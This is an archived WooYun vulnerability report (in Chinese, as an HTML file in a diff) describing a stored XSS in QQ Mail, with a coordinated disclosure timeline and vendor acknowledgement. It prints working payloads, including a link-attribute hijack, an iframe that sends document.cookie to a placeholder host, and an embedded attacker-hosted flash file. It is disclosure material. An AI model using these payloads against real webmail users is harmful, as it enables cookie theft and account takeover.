@@ -1,0 +1,241 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ邮箱鸡肋存储型XSS漏洞的完美利用  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ邮箱鸡肋存储型XSS漏洞的完美利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/idi0t">idi0t</a> 
+</li><li>提交时间：		2013-09-17 14:24</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-07：	细节向普通白帽子公开<br/>
+									2013-10-17：	细节向实习白帽子公开<br/>
+									2013-11-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">QQ邮箱对于一些标签过滤不严格,可构造恶意脚本进行攻击,并可盗取cookie.<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">详细说明就说说这漏洞的偶然发现过程吧。<br />
+<br />
+小白初学,如有错请多包涵,缘起想在乌云注册个ID,无奈要邀请码,上天眷顾,偶然降一小洞,先向一些前辈说声谢谢，都是向你们学的。现学现卖了。<br />
+<br />
+一、要通过邮件进行攻击首先分析在哪里可以查看邮件.<br />
+<br />
+如图1<br />
+<br />
+</p><p class="detail"><a href="../images/17125813fc82dc661643315958edfb5fc1b9252f.png" target="_blank"><img src="../images/17125813fc82dc661643315958edfb5fc1b9252f.png" alt="xss_1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+1.在打开邮件时的界面<br />
+<br />
+2.查看邮件原文(不过邮件内容是base64编码的,但包含了你用html方式写的邮件的原文,也就是未过滤过的)<br />
+<br />
+3.邮件有乱码，也就是漏洞所在页面了<br />
+<br />
+4.还有木有还没在意- -!<br />
+<br />
+<br />
+<br />
+二、发现漏洞页面<br />
+<br />
+在写邮件时,使用html方式写,我想很多人认为在邮件发送的时候被过滤了(其实原文还在,只是邮件显示的时候才被过滤掉的)。<br />
+<br />
+如向对方发送</p><pre><code>&lt;iframe src=&quot;javascript:alert(/Hello World/);&quot;&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+当目标接收并打开邮件时,在点击&quot;邮件有乱码&quot;打开的页面时,神奇的弹窗出现了,说明src没被过滤掉。<br />
+<br />
+<br />
+<br />
+三，漏洞触发场景<br />
+<br />
+一般人是不会去点击&quot;邮件有乱码&quot;这连接的,但我们可以通过css的属性劫持持onclik实现。<br />
+<br />
+我们随意在邮件里添加一张空间的图片(空间图片不会被屏蔽)或者一个连接,在图片或连接的属性里加上&quot;邮件有乱码&quot;这连接的属性，如<br />
+<br />
+</p><pre><code>&lt;a href=&quot;http://xxx.com/&quot; ck=&quot;optMail2&quot; opt=&quot;code&quot; &gt;&lt;/a&gt;</code></pre><p class='detail'><br />
+<br />
+当点击这个连接或者带有ck=&quot;optMail2&quot; opt=&quot;code&quot;属性的图片时，就相当于点击了&quot;邮件有乱码&quot;,就会打开邮件有乱码这个页面。<br />
+<br />
+<br />
+<br />
+四，漏洞利用<br />
+<br />
+刚发现这洞时,觉得有点鸡肋,那接下来就让这鸡肋变成肌肉。<br />
+<br />
+目标:获取cookie<br />
+<br />
+iframe 在chrome下可以直接通过get的方式直接将cookie发给某个页面,如<br />
+<br />
+</p><pre><code>&lt;iframe src=&quot;javascript:img = new Image(); img.src = &#039;http://xxx.com/getcookie.php?&#039;+document.cookie;&quot;&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+但在IE下iframe是禁止跨域的,怎么办呢？当然就是想到非标准的&lt;embed&gt;标签了。<br />
+<br />
+<br />
+<br />
+我们用embed标签加入flash如下:<br />
+<br />
+</p><pre><code>&lt;EMBED type=application/x-shockwave-flash src=http://xxx.com/xss.swf allowscriptaccess=&quot;always&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+结果在邮件显示界面,都会被狠狠的加上<br />
+<br />
+(invokeurls=&quot;false&quot; allownetworking=&quot;none&quot; allowscriptaccess=&quot;never&quot;)这些属性,<br />
+<br />
+百密一疏,但在点击&quot;邮件有乱码&quot;打开的页面依然没有被过滤掉,原来什么样，还是什么样<br />
+<br />
+alway,alway here。<br />
+<br />
+所以当我们点击&quot;邮件有乱码&quot;的连接时,显示的内容是从邮件原文取出并重新过滤的。<br />
+<br />
+注意:实验时千万不要自做聪明的加一些 onerror什么的,会触发一些过滤机制吧,那样src也会被过滤掉。<br />
+<br />
+<br />
+<br />
+这样就可以通过我们的恶意flash在IE浏览器下进行跨域操作了,通过flash获取cookie什么的就得通过想象力了,<br />
+<br />
+关于flash的代码不在重点,略过。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/17130109d7f49a556d4c1c2b5a846fbfae271c79.png" target="_blank"><img src="../images/17130109d7f49a556d4c1c2b5a846fbfae271c79.png" alt="xss_result.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">防止css属性劫持并过滤掉该过滤的。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/idi0t" title="idi0t">idi0t</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037371" title="QQ邮箱鸡肋存储型XSS漏洞的完美利用">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-09-17 16:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈，我们正在跟进处理中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37371";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
